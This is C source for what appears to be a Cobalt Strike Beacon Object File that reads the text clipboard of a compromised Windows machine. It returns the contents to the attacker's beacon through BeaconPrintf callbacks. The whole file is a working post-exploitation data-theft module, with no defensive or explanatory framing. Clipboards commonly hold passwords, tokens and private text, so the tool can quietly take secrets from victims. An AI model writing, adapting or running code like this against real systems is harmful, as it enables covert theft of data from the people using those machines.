#include <windows.h>
#include <winuser.h>
#include "beacon.h"

DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$IsClipboardFormatAvailable(UINT);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);

// Custom strlen to avoid CRT dependency
static size_t custom_strlen(const char* str) {
    size_t len = 0;
    while (str[len] != '\0') len++;
    return len;
}

void go(char *args, unsigned long alen) {
    (void)args; (void)alen;  // Unused parameters
    
    HANDLE hClipData = NULL;
    char* pClipText = NULL;
    
    if (!USER32$IsClipboardFormatAvailable(CF_TEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No text data available in clipboard\n");
        return;
    }
    
    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open clipboard\n");
        return;
    }
    
    hClipData = USER32$GetClipboardData(CF_TEXT);
    if (hClipData == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve clipboard data\n");
        USER32$CloseClipboard();
        return;
    }
    
    pClipText = (char*)KERNEL32$GlobalLock(hClipData);
    if (pClipText == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to lock clipboard data %p\n", hClipData);
        USER32$CloseClipboard();
        return;
    }
    
    if (custom_strlen(pClipText) == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Clipboard is empty\n");
        KERNEL32$GlobalUnlock(hClipData);
        USER32$CloseClipboard();
        return; 
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Clipboard contents:\n%s\n", pClipText);
        KERNEL32$GlobalUnlock(hClipData);
        USER32$CloseClipboard();
        return;
    }
}